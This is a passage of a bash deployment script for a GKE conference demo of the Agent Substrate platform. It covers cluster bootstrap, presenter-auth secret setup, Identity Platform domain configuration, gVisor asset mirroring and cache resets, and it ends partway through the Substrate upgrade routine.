#!/usr/bin/env bash
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Live-stage runner & GKE deployer for the "Running Anything But Agents on Substrate" talk.
#
# Usage:
#   ./hack/stage-demo.sh bootstrap-gke     # Provision GKE cluster (default: us-west3 SLC), install Substrate & deploy all 5 demos
#   ./hack/stage-demo.sh upgrade-substrate # Upgrade ate-system & local kubectl-ate on current GKE cluster to SUBSTRATE_VERSION
#   ./hack/stage-demo.sh deploy            # Build & deploy WorkerPool + all 6 ActorTemplates onto current cluster
#   ./hack/stage-demo.sh run-all         # Run all 5 demos in sequence
#   ./hack/stage-demo.sh act1-dungeon    # Live Demo 1: "Look Ma, No Database" + Save-Scumming (revert & tag)
#   ./hack/stage-demo.sh act1b-dungeon2d # Live Demo 1B: 2D Multilevel Dungeon + Live Mission-Control Dashboard
#   ./hack/stage-demo.sh act2-coldstart  # Live Demo 2: "The Instant Cloner" (12s cold boot -> 100ms clones)
#   ./hack/stage-demo.sh act3-tenantdb   # Live Demo 3: "One DB Per User" (DurableDir + FULLPause/DATACommit)
#   ./hack/stage-demo.sh act4-honeypot   # Live Demo 4: "The Truman Show Honeypot" (per-IP gVisor deception)
#   ./hack/stage-demo.sh act5-timewarp   # Live Demo 5: "Don't Try This at Home" (Time-Jump & Raft Split-Brain)
#   ./hack/stage-demo.sh cleanup         # Tear down demo actors, templates, and WorkerPool

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ATESPACE="anything-but-agents"
ROUTER_URL="${ROUTER_URL:-http://localhost:8000}"
PAUSE_BETWEEN_STEPS="${PAUSE_BETWEEN_STEPS:-1}"
export PATH="${HOME}/.local/go/bin:/usr/bin/go/bin:${HOME}/google-cloud-sdk/bin:${HOME}/go/bin:${HOME}/.local/bin:${PATH}"
export PATH="$(go env GOPATH)/bin:${PATH}"

# Load local .env if present; fall back to worktree parent .env or parent .ate-dev-env.sh if present.
if [[ -f "${REPO_ROOT}/.env" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/.env"
elif [[ -f "${REPO_ROOT}/../../.env" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/../../.env"
elif [[ -f "${REPO_ROOT}/../.ate-dev-env.sh" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/../.ate-dev-env.sh"
fi

# Apply defaults tuned for Salt Lake City (us-west3) once PROJECT_ID is known.
apply_env_defaults() {
  if [[ -z "${PROJECT_ID:-}" ]]; then
    echo "Error: PROJECT_ID is not set." >&2
    echo "Copy .env.example to .env and set your GCP PROJECT_ID:" >&2
    echo "  cp .env.example .env" >&2
    exit 1
  fi

  export GCE_REGION="${GCE_REGION:-us-west3}"
  export CLUSTER_LOCATION="${CLUSTER_LOCATION:-${GCE_REGION}-a}"
  export CLUSTER_NAME="${CLUSTER_NAME:-anything-but-agents}"
  export NODE_MACHINE_TYPE="${NODE_MACHINE_TYPE:-c3-standard-4}"
  export ENABLE_NESTED_VIRTUALIZATION="${ENABLE_NESTED_VIRTUALIZATION:-true}"
  export NETWORK="${NETWORK:-default}"
  export SUBNETWORK="${SUBNETWORK:-default}"
  export BUCKET_NAME="${BUCKET_NAME:-ate-snapshots-${PROJECT_ID}-${GCE_REGION}}"
  export KO_DOCKER_REPO="${KO_DOCKER_REPO:-gcr.io/${PROJECT_ID}/anything-but-agents}"
  export DEMO_DOMAIN="${DEMO_DOMAIN:-substrate.learngke.dev}"
  export SLIDES_DOMAIN="${SLIDES_DOMAIN:-abs.slides.${DEMO_DOMAIN}}"
  export GATEWAY_IP_NAME="${GATEWAY_IP_NAME:-substrate-learngke-ip}"
  export CERT_MAP_NAME="${CERT_MAP_NAME:-substrate-learngke-map}"
  export SUBSTRATE_VERSION="${SUBSTRATE_VERSION:-v1.0.0}"
  export SUBSTRATE_IMAGE_REPO="${SUBSTRATE_IMAGE_REPO:-ghcr.io/agent-substrate/substrate}"
  if [[ -z "${ATE_CREDENTIAL_PROVIDER:-}" ]]; then
    export ATE_CREDENTIAL_PROVIDER='{"name":"k8s.io"}'
  fi
  export KO_DEFAULTPLATFORMS="${KO_DEFAULTPLATFORMS:-linux/amd64}"
  if [[ -z "${SUBSTRATE_ROOT:-}" ]]; then
    for candidate in \
      "${REPO_ROOT}/../../agent-substrate/b-substrate" \
      "${REPO_ROOT}/../../../../agent-substrate/b-substrate" \
      "${REPO_ROOT}/.." \
      "${REPO_ROOT}/../../agent-substrate/substrate" \
      "${REPO_ROOT}/../../../../agent-substrate/substrate"; do
      if [[ -d "${candidate}/cmd/ate-setup" ]]; then
        SUBSTRATE_ROOT="$(cd "${candidate}" && pwd)"
        break
      fi
    done
    export SUBSTRATE_ROOT="${SUBSTRATE_ROOT:-$(cd "${REPO_ROOT}/.." && pwd)}"
  fi
  if [[ -z "${SUBSTRATE_GKE_ROOT:-}" ]]; then
    for candidate in \
      "${REPO_ROOT}/../../ai-on-gke/substrate-gke" \
      "${REPO_ROOT}/../../../../ai-on-gke/substrate-gke" \
      "${REPO_ROOT}/../substrate-gke" \
      "${SUBSTRATE_ROOT}"; do
      if [[ -n "${candidate}" && -d "${candidate}/tools/setup-gcp" ]]; then
        SUBSTRATE_GKE_ROOT="$(cd "${candidate}" && pwd)"
        break
      fi
    done
    export SUBSTRATE_GKE_ROOT="${SUBSTRATE_GKE_ROOT:-${SUBSTRATE_ROOT}}"
  fi

  # Isolate KUBECONFIG and CLOUDSDK_CONFIG so concurrent sessions on the same
  # machine cannot switch current-context or race on gcloud SQLite/log files.
  local src_kubeconfig="${KUBECONFIG:-${HOME}/.kube/config}"
  local isolated_kubeconfig="/tmp/kubeconfig-${CLUSTER_NAME}"
  if [[ -f "${src_kubeconfig}" && "${src_kubeconfig}" != "${isolated_kubeconfig}" ]]; then
    cp "${src_kubeconfig}" "${isolated_kubeconfig}"
    export KUBECONFIG="${isolated_kubeconfig}"
  fi
  local src_gcloud="${CLOUDSDK_CONFIG:-${HOME}/.config/gcloud}"
  local isolated_gcloud="/tmp/gcloud-${CLUSTER_NAME}"
  if [[ -d "${src_gcloud}" && "${src_gcloud}" != "${isolated_gcloud}" ]]; then
    if [[ ! -d "${isolated_gcloud}" ]]; then
      cp -r "${src_gcloud}" "${isolated_gcloud}" 2>/dev/null || true
    fi
    if [[ -d "${isolated_gcloud}" ]]; then
      export CLOUDSDK_CONFIG="${isolated_gcloud}"
    fi
  fi
  local target_ctx="${KUBE_CONTEXT:-gke_${PROJECT_ID}_${CLUSTER_LOCATION}_${CLUSTER_NAME}}"
  kubectl config use-context "${target_ctx}" >/dev/null 2>&1 || true
}

if [[ -n "${PROJECT_ID:-}" ]]; then
  apply_env_defaults
fi

banner() {
  echo ""
  echo -e "\033[1;36m================================================================================\033[0m"
  echo -e "\033[1;36m  $*\033[0m"
  echo -e "\033[1;36m================================================================================\033[0m"
}

step() {
  echo ""
  echo -e "\033[1;33m>>> $*\033[0m"
  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    read -r -p "    [Press Enter to execute] " _
  fi
}

run_cmd() {
  echo -e "\033[1;32m$ $*\033[0m"
  "$@"
}

resolve_gke_version() {
  if [[ -n "${CLUSTER_VERSION:-}" ]]; then
    return
  fi
  # Pick the latest 1.36.* or 1.37.* GKE version served in CLUSTER_LOCATION
  # (Agent Substrate requires Kubernetes 1.36+ for PodCertificateRequest / ClusterTrustBundle).
  local detected
  detected="$(gcloud container get-server-config \
    --project="${PROJECT_ID}" \
    --zone="${CLUSTER_LOCATION}" \
    --format="value(validMasterVersions)" 2>/dev/null \
    | tr ';' '\n' \
    | grep -E '^1\.(36|37)\.' \
    | head -n 1 || true)"
  export CLUSTER_VERSION="${detected:-1.36.4-gke.1495000}"
}

allowed_ingress_spiffe_ids() {
  echo "spiffe://cluster.local/ns/anything-but-agents/sa/default,spiffe://cluster.local/ns/anything-but-agents/sa/slides-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/dungeon2d-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/coldstart-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/tenantdb-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/honeypot-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/timewarp-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/buildbox-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/billing-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/canvas-gateway"
}

ensure_router_ingress_spiffe_ids() {
  ensure_credential_provider_namespace_policy
  if ! kubectl get deployment atenet-router -n ate-system >/dev/null 2>&1; then
    return 0
  fi
  local desired current_args patch_json
  desired="$(allowed_ingress_spiffe_ids)"
  current_args="$(kubectl get deployment atenet-router -n ate-system -o jsonpath='{.spec.template.spec.containers[0].args}' 2>/dev/null || true)"
  if [[ "${current_args}" == *"buildbox-gateway"* && "${current_args}" == *"billing-gateway"* && "${current_args}" == *"canvas-gateway"* ]]; then
    return 0
  fi
  echo "Updating deployment/atenet-router --ingress-allowed-spiffe-ids for all 9 gateways..."
  patch_json="$(CURRENT_ARGS="${current_args}" DESIRED="${desired}" python3 - <<'PY'
import json, os
args = json.loads(os.environ["CURRENT_ARGS"])
desired = os.environ["DESIRED"]
new_args = []
replaced = False
for a in args:
    if a.startswith("--ingress-allowed-spiffe-ids="):
        existing = [x for x in a.split("=", 1)[1].split(",") if x]
        for item in desired.split(","):
            if item and item not in existing:
                existing.append(item)
        new_args.append("--ingress-allowed-spiffe-ids=" + ",".join(existing))
        replaced = True
    else:
        new_args.append(a)
if not replaced:
    new_args.append("--ingress-allowed-spiffe-ids=" + desired)
print(json.dumps([{"op": "replace", "path": "/spec/template/spec/containers/0/args", "value": new_args}]))
PY
)"
  kubectl patch deployment atenet-router -n ate-system --type=json -p="${patch_json}" >/dev/null
  kubectl rollout status deployment/atenet-router -n ate-system --timeout=120s
}

ensure_credential_provider_namespace_policy() {
  if ! kubectl get deployment k8s-credential-provider -n ate-system >/dev/null 2>&1; then
    return 0
  fi
  local current_policy
  current_policy="$(kubectl get configmap k8s-credential-provider-namespace-policy -n ate-system -o jsonpath='{.data.namespace-policy\.yaml}' 2>/dev/null || true)"
  if [[ "${current_policy}" == *"anything-but-agents"* ]]; then
    return 0
  fi
  echo "Authorizing atespace 'anything-but-agents' in k8s-credential-provider-namespace-policy..."
  kubectl apply -f - >/dev/null <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: k8s-credential-provider-namespace-policy
  namespace: ate-system
data:
  namespace-policy.yaml: |
    policies:
    - atespace: anything-but-agents
      allowedNamespaces:
      - anything-but-agents
EOF
  kubectl rollout restart deployment/k8s-credential-provider -n ate-system >/dev/null
  kubectl rollout status deployment/k8s-credential-provider -n ate-system --timeout=120s
}

sync_substrate_root_version() {
  if [[ -z "${SUBSTRATE_ROOT:-}" || ! -d "${SUBSTRATE_ROOT}/.git" || -z "${SUBSTRATE_VERSION:-}" ]]; then
    return 0
  fi
  (
    cd "${SUBSTRATE_ROOT}"
    local target_commit head_commit
    if ! git rev-parse --verify "${SUBSTRATE_VERSION}^{commit}" >/dev/null 2>&1; then
      git fetch --tags origin >/dev/null 2>&1 || true
    fi
    target_commit="$(git rev-parse --verify "${SUBSTRATE_VERSION}^{commit}" 2>/dev/null || true)"
    head_commit="$(git rev-parse HEAD 2>/dev/null || true)"
    if [[ -n "${target_commit}" && "${head_commit}" != "${target_commit}" ]]; then
      if [[ -z "$(git status --porcelain --untracked-files=no 2>/dev/null)" ]]; then
        echo "Switching ${SUBSTRATE_ROOT} to ${SUBSTRATE_VERSION} (${target_commit:0:12})..." >&2
        git checkout --detach "${SUBSTRATE_VERSION}" >/dev/null 2>&1 || true
      else
        echo "WARNING: ${SUBSTRATE_ROOT} has uncommitted tracked changes; staying at ${head_commit:0:12} instead of ${SUBSTRATE_VERSION}." >&2
      fi
    fi
  )
}

install_local_kubectl_ate() {
  if [[ -z "${SUBSTRATE_ROOT:-}" || ! -d "${SUBSTRATE_ROOT}/cmd/kubectl-ate" ]]; then
    echo "Error: SUBSTRATE_ROOT (${SUBSTRATE_ROOT:-}) does not contain cmd/kubectl-ate." >&2
    exit 1
  fi
  sync_substrate_root_version
  (
    cd "${SUBSTRATE_ROOT}"
    local commit build_date
    commit="$(git rev-parse HEAD 2>/dev/null || echo unknown)"
    build_date="$(git show -s --format=%cI HEAD 2>/dev/null || date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "Installing local kubectl-ate (${SUBSTRATE_VERSION}, commit=${commit:0:12}) from ${SUBSTRATE_ROOT}..."
    go install -ldflags "-X go.ate.dev/substrate/internal/version.Version=${SUBSTRATE_VERSION} -X go.ate.dev/substrate/internal/version.Commit=${commit} -X go.ate.dev/substrate/internal/version.BuildDate=${build_date}" ./cmd/kubectl-ate
  )
}

mirror_gvisor_assets() {
  local sc_json
  sc_json="$(kubectl get sandboxconfigs.v1.ate.dev gvisor-default -o json 2>/dev/null || true)"
  if [[ -z "${sc_json}" ]]; then
    return 0
  fi
  local rows
  rows="$(SC_JSON="${sc_json}" python3 - <<'PY'
import json, os
sc = json.loads(os.environ.get("SC_JSON", "{}"))
for idx, ver in enumerate(sc.get("spec", {}).get("versions", [])):
    url = ver.get("assets", {}).get("amd64", {}).get("gvisor", {}).get("url", "")
    if url.startswith("gs://gvisor/"):
        print(f"{idx}\t{ver.get('name', idx)}\t{url}")
PY
)"
  if [[ -z "${rows}" ]]; then
    return 0
  fi
  local patched=0
  while IFS=$'\t' read -r idx ver_name src_url; do
    [[ -z "${src_url}" ]] && continue
    local rel_path="${src_url#gs://gvisor/}"
    local dst_url="gs://${BUCKET_NAME}-assets/${rel_path}"
    echo "Mirroring gVisor runtime asset (${ver_name}) ${src_url} -> ${dst_url}..."
    gcloud storage cp --no-clobber --quiet --project="${PROJECT_ID}" "${src_url}" "${dst_url}"
    kubectl patch sandboxconfigs.v1.ate.dev gvisor-default --type=json \
      -p="[{\"op\":\"replace\",\"path\":\"/spec/versions/${idx}/assets/amd64/gvisor/url\",\"value\":\"${dst_url}\"}]"
    patched=1
  done <<< "${rows}"
  if [[ "${patched}" -eq 1 ]]; then
    kubectl rollout restart daemonset/atelet -n ate-system >/dev/null 2>&1 || true
    kubectl rollout status daemonset/atelet -n ate-system --timeout=180s
  fi
}

reset_node_image_cache() {
  local target_layout="${1:-3}"
  if ! kubectl get namespace ate-system >/dev/null 2>&1; then
    return 0
  fi
  echo "Ensuring node /var/lib/ate/image-cache matches atelet layout version ${target_layout}..."
  kubectl delete daemonset/atelet -n ate-system --ignore-not-found --wait=true >/dev/null 2>&1 || true
  kubectl apply -f - >/dev/null <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: atelet-cache-reset
  namespace: ate-system
spec:
  selector:
    matchLabels:
      app: atelet-cache-reset
  template:
    metadata:
      labels:
        app: atelet-cache-reset
    spec:
      tolerations:
      - key: ate.dev/sandboxClass
        operator: Exists
        effect: NoSchedule
      - key: cloud.google.com/compute-class
        operator: Exists
        effect: NoSchedule
      initContainers:
      - name: reset
        image: debian:13-slim@sha256:d7e12182ce18b85b93007c1dedf31f2d29e01ccf3182cc4017c709b6259bc132
        command:
        - sh
        - -c
        - |
          ver="\$(cat /var/lib/ate/image-cache/version 2>/dev/null || true)"
          if [ -n "\$ver" ] && [ "\$ver" != "${target_layout}" ]; then
            echo "Resetting /var/lib/ate/image-cache (layout version \$ver -> ${target_layout})"
            rm -rf /var/lib/ate/image-cache
          fi
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: ate-base
          mountPath: /var/lib/ate
      containers:
      - name: pause
        image: debian:13-slim@sha256:d7e12182ce18b85b93007c1dedf31f2d29e01ccf3182cc4017c709b6259bc132
        command: ["sh", "-c", "sleep 3600"]
      volumes:
      - name: ate-base
        hostPath:
          path: /var/lib/ate
          type: DirectoryOrCreate
EOF
  kubectl rollout status daemonset/atelet-cache-reset -n ate-system --timeout=180s >/dev/null
  kubectl delete daemonset/atelet-cache-reset -n ate-system --ignore-not-found --wait=true >/dev/null
}

resolve_kubectl_ate_image() {
  if [[ -n "${KUBECTL_ATE_IMAGE:-}" ]]; then
    export KUBECTL_ATE_IMAGE
    return 0
  fi
  if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}/cmd/kubectl-ate" ]]; then
    sync_substrate_root_version
    echo "Building kubectl-ate (${SUBSTRATE_VERSION}) container image from ${SUBSTRATE_ROOT}..."
    KUBECTL_ATE_IMAGE="$(
      cd "${SUBSTRATE_ROOT}"
      KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
    )"
  else
    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to build the gateway kubectl-ate initContainer image." >&2
    exit 1
  fi
  export KUBECTL_ATE_IMAGE
}

ensure_presenter_auth() {
  kubectl apply -f - >/dev/null <<'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: anything-but-agents
  labels:
    ate.dev/api-access: "true"
EOF

  local session_hmac_secret presenter_token
  session_hmac_secret="$(kubectl get secret presenter-auth -n anything-but-agents -o jsonpath='{.data.SESSION_HMAC_SECRET}' 2>/dev/null | base64 -d || true)"
  presenter_token="${PRESENTER_TOKEN:-}"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(kubectl get secret presenter-auth -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  fi
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  fi
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(kubectl get secret slides-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  fi
  if [[ -z "${session_hmac_secret}" ]]; then
    session_hmac_secret="$(openssl rand -hex 32)"
  fi
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi

  local tmp_secret_env tmp_gw_env
  tmp_secret_env="$(mktemp)"
  tmp_gw_env="$(mktemp)"
  chmod 600 "${tmp_secret_env}" "${tmp_gw_env}"
  printf 'SESSION_HMAC_SECRET=%s\nPRESENTER_TOKEN=%s\n' "${session_hmac_secret}" "${presenter_token}" > "${tmp_secret_env}"
  printf 'PRESENTER_TOKEN=%s\n' "${presenter_token}" > "${tmp_gw_env}"

  kubectl create secret generic presenter-auth \
    -n anything-but-agents \
    --from-env-file="${tmp_secret_env}" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  for gw_sec in slides-gateway dungeon2d-gateway coldstart-gateway tenantdb-gateway honeypot-gateway timewarp-gateway buildbox-gateway billing-gateway canvas-gateway; do
    kubectl create secret generic "${gw_sec}" \
      -n anything-but-agents \
      --from-env-file="${tmp_gw_env}" \
      --dry-run=client -o yaml | kubectl apply -f - >/dev/null
  done
  rm -f "${tmp_secret_env}" "${tmp_gw_env}"

  local google_client_id="${GOOGLE_CLIENT_ID:-}"
  local firebase_api_key="${FIREBASE_API_KEY:-}"
  local allowed_domains="${ALLOWED_GOOGLE_DOMAINS:-}"

  if [[ -z "${allowed_domains}" ]]; then
    allowed_domains="$(kubectl get configmap presenter-auth -n anything-but-agents -o jsonpath='{.data.ALLOWED_GOOGLE_DOMAINS}' 2>/dev/null || true)"
  fi

  if [[ -n "${allowed_domains}" ]]; then
    local access_token=""
    if [[ -n "${PROJECT_ID:-}" ]]; then
      access_token="$(gcloud auth application-default print-access-token --quiet 2>/dev/null || gcloud auth print-access-token --quiet 2>/dev/null || true)"
    fi

    if [[ -n "${access_token}" && -n "${PROJECT_ID:-}" ]]; then
      if [[ -z "${google_client_id}" ]]; then
        local idp_json
        idp_json="$(curl -fsS -H "Authorization: Bearer ${access_token}" -H "x-goog-user-project: ${PROJECT_ID}" \
          "https://identitytoolkit.googleapis.com/admin/v2/projects/${PROJECT_ID}/defaultSupportedIdpConfigs/google.com" 2>/dev/null || true)"
        if [[ -n "${idp_json}" ]]; then
          google_client_id="$(python3 -c 'import json,sys; print(json.loads(sys.stdin.read()).get("clientId",""))' <<< "${idp_json}" 2>/dev/null || true)"
        fi
      fi

      local cfg_json
      cfg_json="$(curl -fsS -H "Authorization: Bearer ${access_token}" -H "x-goog-user-project: ${PROJECT_ID}" \
        "https://identitytoolkit.googleapis.com/admin/v2/projects/${PROJECT_ID}/config" 2>/dev/null || true)"
      if [[ -n "${cfg_json}" ]]; then
        if [[ -z "${firebase_api_key}" ]]; then
          firebase_api_key="$(python3 -c 'import json,sys; print(json.loads(sys.stdin.read()).get("client",{}).get("apiKey",""))' <<< "${cfg_json}" 2>/dev/null || true)"
        fi
        local patch_payload
        patch_payload="$(CFG_JSON="${cfg_json}" python3 - "${DEMO_DOMAIN}" "${SLIDES_DOMAIN}" <<'PY'
import json, os, sys
demo_domain, slides_domain = sys.argv[1], sys.argv[2]
try:
    cfg = json.loads(os.environ.get("CFG_JSON", ""))
except Exception:
    sys.exit(0)
existing = list(cfg.get("authorizedDomains", []))
required = [
    "localhost",
    demo_domain,
    slides_domain,
    f"slides.{demo_domain}",
    f"dungeon.{demo_domain}",
    f"coldstart.{demo_domain}",
    f"tenantdb.{demo_domain}",
    f"honeypot.{demo_domain}",
    f"timewarp.{demo_domain}",
    f"buildbox.{demo_domain}",
    f"billing.{demo_domain}",
    f"canvas.{demo_domain}",
]
missing = [d for d in required if d and d not in existing]
if missing:
    print(json.dumps({"authorizedDomains": existing + missing}))
PY
)"
        if [[ -n "${patch_payload}" ]]; then
          echo "Authorizing demo hostnames in Identity Platform authorizedDomains..."
          if ! curl -fsS -X PATCH \
            -H "Authorization: Bearer ${access_token}" \
            -H "x-goog-user-project: ${PROJECT_ID}" \
            -H "Content-Type: application/json" \
            -d "${patch_payload}" \
            "https://identitytoolkit.googleapis.com/admin/v2/projects/${PROJECT_ID}/config?updateMask=authorizedDomains" >/dev/null; then
            echo "WARNING: Failed to update Identity Platform authorizedDomains; Firebase popup sign-in may fail with auth/unauthorized-domain." >&2
          fi
        fi
      fi
    fi

    if [[ -z "${google_client_id}" ]]; then
      google_client_id="$(kubectl get configmap presenter-auth -n anything-but-agents -o jsonpath='{.data.GOOGLE_CLIENT_ID}' 2>/dev/null || true)"
    fi
    if [[ -z "${firebase_api_key}" ]]; then
      firebase_api_key="$(kubectl get configmap presenter-auth -n anything-but-agents -o jsonpath='{.data.FIREBASE_API_KEY}' 2>/dev/null || true)"
    fi

    local tmp_cm_env
    tmp_cm_env="$(mktemp)"
    chmod 600 "${tmp_cm_env}"
    {
      printf 'ALLOWED_GOOGLE_DOMAINS=%s\n' "${allowed_domains}"
      printf 'GOOGLE_CLIENT_ID=%s\n' "${google_client_id}"
      printf 'FIREBASE_API_KEY=%s\n' "${firebase_api_key}"
      printf 'FIREBASE_PROJECT_ID=%s\n' "${PROJECT_ID:-}"
      printf 'COOKIE_DOMAIN=%s\n' "${DEMO_DOMAIN}"
    } > "${tmp_cm_env}"

    kubectl create configmap presenter-auth \
      -n anything-but-agents \
      --from-env-file="${tmp_cm_env}" \
      --dry-run=client -o yaml | kubectl apply -f - >/dev/null
    rm -f "${tmp_cm_env}"
    echo "Configured cross-subdomain Google Sign-In (ALLOWED_GOOGLE_DOMAINS=${allowed_domains}, COOKIE_DOMAIN=${DEMO_DOMAIN})"
  fi

  PRESENTER_AUTH_HASH="$(printf '%s|%s|%s|%s|%s|%s' \
    "${session_hmac_secret}" "${presenter_token}" "${allowed_domains}" \
    "${google_client_id}" "${firebase_api_key}" "${DEMO_DOMAIN}" \
    | sha256sum | awk '{print substr($1,1,16)}')"
  export PRESENTER_AUTH_HASH
}

bootstrap_gke() {
  apply_env_defaults
  if [[ ! -d "${SUBSTRATE_GKE_ROOT:-}/tools/setup-gcp" ]]; then
    echo "Error: SUBSTRATE_GKE_ROOT (${SUBSTRATE_GKE_ROOT:-}) does not contain tools/setup-gcp." >&2
    echo "Clone https://github.com/ai-on-gke/substrate-gke and set SUBSTRATE_GKE_ROOT in .env." >&2
    exit 1
  fi

  banner "Bootstrapping GKE Cluster in ${CLUSTER_LOCATION} (Region: ${GCE_REGION})"
  export PROJECT_NUMBER="${PROJECT_NUMBER:-$(gcloud projects describe "${PROJECT_ID}" --quiet --format="value(projectNumber)")}"
  resolve_gke_version

  echo "Configuration:"
  echo "  PROJECT_ID                   = ${PROJECT_ID} (${PROJECT_NUMBER})"
  echo "  GCE_REGION                   = ${GCE_REGION} (Salt Lake City = us-west3)"
  echo "  CLUSTER_LOCATION             = ${CLUSTER_LOCATION}"
  echo "  CLUSTER_NAME                 = ${CLUSTER_NAME}"
  echo "  CLUSTER_VERSION              = ${CLUSTER_VERSION}"
  echo "  NODE_MACHINE_TYPE            = ${NODE_MACHINE_TYPE}"
  echo "  ENABLE_NESTED_VIRTUALIZATION = ${ENABLE_NESTED_VIRTUALIZATION}"
  echo "  BUCKET_NAME                  = ${BUCKET_NAME}"
  echo "  KO_DOCKER_REPO               = ${KO_DOCKER_REPO}"
  echo "  SUBSTRATE_IMAGE_REPO         = ${SUBSTRATE_IMAGE_REPO}"
  echo "  SUBSTRATE_VERSION            = ${SUBSTRATE_VERSION}"

  (
    cd "${SUBSTRATE_GKE_ROOT}"
    go run ./tools/setup-gcp bootstrap \
      --project-id="${PROJECT_ID}" \
      --project-number="${PROJECT_NUMBER}" \
      --region="${GCE_REGION}" \
      --cluster-name="${CLUSTER_NAME}" \
      --cluster-location="${CLUSTER_LOCATION}" \
      --cluster-version="${CLUSTER_VERSION}" \
      --machine-type="${NODE_MACHINE_TYPE}" \
      --enable-nested-virtualization="${ENABLE_NESTED_VIRTUALIZATION}" \
      --network="${NETWORK}" \
      --subnetwork="${SUBNETWORK}" \
      --bucket-name="${BUCKET_NAME}"

    gcloud container clusters get-credentials "${CLUSTER_NAME}" \
      --location="${CLUSTER_LOCATION}" \
      --project="${PROJECT_ID}" \
      --quiet

    # Disable node auto-upgrade on the worker pool so GKE maintenance doesn't
    # evict running actors mid-demo.
    gcloud container node-pools update substrate-node-pool \
      --cluster="${CLUSTER_NAME}" \
      --location="${CLUSTER_LOCATION}" \
      --project="${PROJECT_ID}" \
      --no-enable-autoupgrade \
      --quiet || true
  )

  install_local_kubectl_ate

  local allowed_spiffe
  allowed_spiffe="$(allowed_ingress_spiffe_ids)"

  (
    cd "${SUBSTRATE_ROOT}"
    local image_flags=()
    if [[ -n "${SUBSTRATE_IMAGE_REPO:-}" && -n "${SUBSTRATE_VERSION:-}" ]]; then
      image_flags=(--image-repo="${SUBSTRATE_IMAGE_REPO}" --image-tag="${SUBSTRATE_VERSION}")
    fi
    go run ./cmd/ate-setup deploy ate-system \
      --no-dev-env \
      --sandbox-classes=gvisor \
      "${image_flags[@]}" \
      --snapshot-location="gs://${BUCKET_NAME}/" \
      --snapshot-transfer-gsa-name="ate-snapshot-transfer" \
      --gcp-project-id="${PROJECT_ID}" \
      --gcp-cluster-name="${CLUSTER_NAME}" \
      --gcp-cluster-location="${CLUSTER_LOCATION}" \
      --credential-provider="${ATE_CREDENTIAL_PROVIDER}" \
      --ingress-allowed-spiffe-ids="${allowed_spiffe}"

    if [[ ${#image_flags[@]} -eq 0 ]]; then
      go run ./cmd/ate-setup publish worker-images
    fi
  )

  mirror_gvisor_assets
  deploy_all
}

upgrade_substrate() {
  detect_cluster_defaults
  if [[ ! -d "${SUBSTRATE_ROOT:-}/cmd/ate-setup" ]]; then
    echo "Error: SUBSTRATE_ROOT (${SUBSTRATE_ROOT:-}) does not contain cmd/ate-setup." >&2
    exit 1
  fi

  banner "Upgrading Agent Substrate (ate-system) on ${CLUSTER_NAME} to ${SUBSTRATE_VERSION}"
  install_local_kubectl_ate

  local current_ver=""
  current_ver="$(kubectl exec -n ate-system deploy/ate-api-server -- /ko-app/ateapi --version 2>/dev/null | awk 'NR==1 {print $1}' || true)"
  echo "Current cluster ate-api-server version: ${current_ver:-<none>}"
  echo "Target SUBSTRATE_VERSION             : ${SUBSTRATE_VERSION}"
  echo "Target SUBSTRATE_IMAGE_REPO          : ${SUBSTRATE_IMAGE_REPO}"

  if kubectl get crd workerpools.ate.dev >/dev/null 2>&1; then
    echo "Removing existing WorkerPools before control-plane upgrade..."
    kubectl delete workerpools --all -A --ignore-not-found --wait=true 2>/dev/null || true
  fi

  local stored_versions=""
  stored_versions="$(kubectl get crd workerpools.ate.dev -o jsonpath='{.status.storedVersions[*]}' 2>/dev/null || true)"
  if [[ "${stored_versions}" == *"v1alpha1"* ]]; then
    echo "Replacing legacy ate.dev/v1alpha1 CRDs with ate.dev/v1..."
    for sc in $(kubectl get sandboxconfigs -o name 2>/dev/null || true); do
      kubectl patch "${sc}" --type=merge -p='{"metadata":{"finalizers":null}}' 2>/dev/null || true
    done
    kubectl delete sandboxconfigs --all --ignore-not-found 2>/dev/null || true
